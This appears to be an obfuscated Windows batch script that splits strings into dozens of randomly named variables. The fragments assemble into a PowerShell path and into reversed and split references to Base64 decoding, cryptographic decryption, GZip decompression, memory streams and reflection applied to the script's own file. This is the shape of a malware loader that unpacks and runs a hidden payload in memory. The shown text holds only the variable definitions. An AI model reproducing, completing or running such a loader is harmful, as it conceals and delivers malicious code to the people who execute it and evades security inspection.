@echo off
set "FxSiTyNDxQ=.e"
set "vYLrcEoVLm=ws"
set "ifBMwRsEDh=he"
set "jFOHjaTHoh=co"
set "XQqnaIqYcG=\v"
set "UgvDoTbYxb=s\"
set "DrjgQiascH= C"
set "jzidcUEJdH=ll"
set "uxcADzdwxg=he"
set "jetQqXhbso=we"
set "FDylIMsHLc= /"
set "QxkPODnhWs=32"
set "WyOibRvHRb=nd"
set "jKplJOVEeF=Wi"
set "rkaynMzlxq=0\"
set "mIozlOHWvB=rS"
set "PwGXQIfIKZ=st"
set "GKsDEmRkiq=ll"
set "wLkppNPRan=rs"
set "kAucnvGxFx=we"
set "NtoxgIsNNU=in"
set "VEdAKQdlTi=em"
set "eBJSDsmRjn=do"
set "GBLclkexYP=:\"
set "VFJJIKmtSX=y "
set "lEtMPYEtsx=py"
set "WqqiPyzxMG=\W"
set "nwnxKiMDat=Sy"
set "NpOmMeDHuy=xe"
set "PlrhLNyTyN=1."
set "kXTNDDgOAV=po"
set "ZAEHAJTqBE=ow"
set "qFynvwiMIf=Po"
set "pGbisGfZqm= %~dp0"
set "utpVFoQjrU=cd"
set "xBnCeVnnKr=in $"
set "dUkQlsVJPD=]::("
set "TiUVXpAODL=tem."
set "PfqJTOBLoq=am;$"
set "KzQGnxZlpy=saBm"
set "UwmrtgsFKV='[-1"
set "PiZKtFgcph=..-1"
set "oYhMJsUryd=iOdg"
set "ViPsuZehOC=PKCS"
set "tAjIlYWnIz=em.C"
set "dFLjSkLSTb=TuCw"
set "sUNcaPUnER=, (,"
set "zPPhkcoTgk=::('"
set "duwQporHTM=bgF "
set "gSFWluDbFr=grap"
set "VFUILFkcFH=U = "
set "ieGNuGLDrl=]::("
set "YKIldsPBjC=SfiP"
set "AoPyRFFazo=esMa"
set "vMtUNAFUdK=($TW"
set "BiCRmBqlZk=bstr"
set "RBGADqJTLQ=wfBW"
set "JHbteJhsQz= = $"
set "NyEJKNHLca=yste"
set "PHdoDswelr=ddin"
set "vpEgamUFFY=('%~f0'"
set "EUYjMdREZm= = $"
set "CjnnAwsDQY=trea"
set "ANbPPEcMQm=ose("
set "HQbhXkZgoL=Mode"
set "zKnDjOklAQ=ptog"
set "NTrYvSHmMR=oArr"
set "iEbZayXOnn=ew-O"
set "CFcTdsimbL=hy.A"
set "vblMrBNIbR=)) {"
set "WrLpHMygOQ=('%*'"
set "gnuLNLyTxA=/a3B"
set "ZOMoyCMteY=Secu"
set "lAsIbHmwjn=toqU"
set "rjAHMZraVj=ring"
set "ccLFEdCasI=);$Q"
set "zsLMVmxXUt=bgF."
set "ovJuGphzls=16] "
set "ZYPrCgrYKB=ress"
set "lxmjphNqdy=6esa"
set "MVITRACgJl=esaB"
set "IYVCRPkvQh=.Dis"
set "lkdONWzIki=hFF."
set "okGKFQiaKL=znSk"
set "chdoMoPGsc=O.Me"
set "XVwmpluxmr=();$"
set "YDnPcZMjro=F.Su"
set "evQeJPlavh=2Q+X"
set "oxyRImLGzB=mory"
set "ctiKymracj=e = "
set "RYnYbBrUoS=daeR"
set "uxnQhrlxNu=join"
set "ygFTXdnqiY=onve"
set "HweEkybDLc=Iu, "
set "qroTnYddgX=Conv"
set "AevQdIwoYo=n ''"
set "kdxowoqHdE=.Mem"
set "VMQfUiLUQQ=$QSf"
set "fqRLbafnuG=VCbk"
set "rmfdgZJngY=.Key"
set "KVCmsIZCFw= '')"
set "yrSJlsHTyt= = N"
set "hwAHWIOGVG=SoYj"
set "mWsEfLpwGk=; };"
set "lidcdNbjtU=$RKB"
set "WwXbJfagEW=Stre"
set "gzZCMOJpiU=[Sys"
set "vGoaBWqYKw=null"
set "IRfnbLvhqb=flec"
set "FJbBZRDvOZ=-4] "
set "wRpWvfSgPV=[Env"
set "rHmLKtSRlJ=brea"
set "uxchKiiwEO=.Cop"
set "xGRPHnIILb=iron"
set "lbhuEzRUSa=:('g"
set "DOtutIIeqL=Etk/"
set "UGKMZbMMTl='gni"
set "JkWWUntMYy=morF"
set "eZXxSVNQQM=ing("
set "OUJLfcKgRL=ay()"
set "dKQaAhgmUM=gnir"
set "zORYhxZSyM= '')"
set "jCPCMFPYWg=fiPS"
set "sOEKuybLqM=Hi.T"
set "PjMTkNBZKs=[-1."
set "bEgbNwlASW=and "
set "mMusyuYuCg=A = "
set "kKCEZDEfgB=$fiP"
set "SlBrjRxwMS=ateD"
set "WJAWmfHzqg=bjec"
set "aTnJHXyAIV=ionM"
set "JqJJTfMCxw=le  "
set "OmadHhKIMg=File"
set "YAEoCrFvHA=.GZi"
set "hYOhVtynJj=::De"
set "wVPOeitfpa=)))"
set "VAuyPIaemW=($TW"
set "fjxLPSppmL=fore"
set "lsxhIItibE=orF'"
set "EZDJdDHRhE=6] -"
